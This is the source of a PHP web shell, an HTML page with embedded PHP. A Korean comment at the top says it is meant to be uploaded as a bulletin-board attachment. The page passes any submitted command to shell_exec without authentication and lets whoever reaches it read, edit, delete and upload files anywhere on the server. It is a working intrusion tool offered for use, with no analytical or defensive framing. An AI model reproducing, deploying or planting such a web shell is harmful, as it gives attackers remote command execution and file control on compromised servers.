<!-- 쉘스크립트 실행 코드, 게시판 첨부파일에 올릴 것 -->
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PHP WebShell</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            color: #333;
        }
        .container {
            max-width: 900px;
            margin: auto;
            padding: 20px;
            background: #fff;
            border-radius: 5px;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
        }
        .output {
            white-space: pre-wrap;
            background: #333;
            color: #0f0;
            padding: 10px;
            border-radius: 5px;
            overflow: auto;
            height: 200px;
        }
        textarea {
            width: 100%;
            height: 150px;
        }
        input, button {
            margin: 5px;
        }
    </style>
</head>
<body>
<div class="container">
    <h1>PHP WebShell</h1>

    <!-- 명령 실행 -->
    <form method="post">
        <h3>Command Execution</h3>
        <input type="text" name="cmd" placeholder="Enter command" style="width: 300px;">
        <button type="submit">Execute</button>
    </form>

    <!-- 파일 작업 -->
    <form method="post">
        <h3>File Operations</h3>
        <input type="text" name="file_path" placeholder="File Path" style="width: 300px;">
        <button type="submit" name="view_file">View</button>
        <button type="submit" name="edit_file">Edit</button>
        <button type="submit" name="delete_file">Delete</button>
    </form>

    <!-- 파일 편집 -->
    <?php
    if (isset($_POST['edit_file']) && !empty($_POST['file_path'])) {
        $filePath = $_POST['file_path'];
        if (file_exists($filePath)) {
            echo '<form method="post">
                    <h3>Editing: ' . htmlspecialchars($filePath, ENT_QUOTES, 'UTF-8') . '</h3>
                    <textarea name="file_content">' . htmlspecialchars(file_get_contents($filePath), ENT_QUOTES, 'UTF-8') . '</textarea>
                    <input type="hidden" name="file_path" value="' . htmlspecialchars($filePath, ENT_QUOTES, 'UTF-8') . '">
                    <button type="submit" name="save_file">Save</button>
                  </form>';
        } else {
            echo "File does not exist.";
        }
    }
    ?>

    <!-- 파일 업로드 -->
    <form method="post" enctype="multipart/form-data">
        <h3>File Upload</h3>
        <input type="text" name="upload_path" placeholder="Target Directory" value="<?= htmlspecialchars(getcwd(), ENT_QUOTES, 'UTF-8') ?>" style="width: 300px;">
        <input type="file" name="upload_file">
        <button type="submit" name="upload">Upload</button>
    </form>

    <h3>Output</h3>
    <div class="output">
        <?php
        header('Content-Type: text/html; charset=UTF-8');

        // 명령 실행
        if (!empty($_POST['cmd'])) {
            $output = shell_exec($_POST['cmd'] . " 2>&1");
            echo htmlspecialchars($output ?: "No output.", ENT_QUOTES, 'UTF-8');
        }

        // 파일 보기
        if (isset($_POST['view_file']) && !empty($_POST['file_path'])) {
            $filePath = $_POST['file_path'];
            if (file_exists($filePath)) {
                echo "Contents of " . htmlspecialchars($filePath, ENT_QUOTES, 'UTF-8') . ":\n";
                echo htmlspecialchars(file_get_contents($filePath), ENT_QUOTES, 'UTF-8');
            } else {
                echo "File does not exist.";
            }
        }

        // 파일 저장
        if (isset($_POST['save_file']) && !empty($_POST['file_path']) && isset($_POST['file_content'])) {
            $filePath = $_POST['file_path'];
            $fileContent = $_POST['file_content'];
            if (file_put_contents($filePath, $fileContent) !== false) {
                echo "File saved successfully.";
            } else {
                echo "Failed to save file.";
            }
        }

        // 파일 삭제
        if (isset($_POST['delete_file']) && !empty($_POST['file_path'])) {
            $filePath = $_POST['file_path'];
            if (file_exists($filePath) && unlink($filePath)) {
                echo "File deleted: " . htmlspecialchars($filePath, ENT_QUOTES, 'UTF-8');
            } else {
                echo "Failed to delete file or file does not exist.";
            }
        }

        // 파일 업로드
        if (!empty($_FILES['upload_file']['name']) && !empty($_POST['upload_path'])) {
            $uploadDir = rtrim($_POST['upload_path'], DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR;
            $uploadFile = $uploadDir . basename($_FILES['upload_file']['name']);
            if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $uploadFile)) {
                echo "File uploaded to: " . htmlspecialchars($uploadFile, ENT_QUOTES, 'UTF-8');
            } else {
                echo "File upload failed.";
            }
        }
        ?>
    </div>
</div>
</body>
</html>
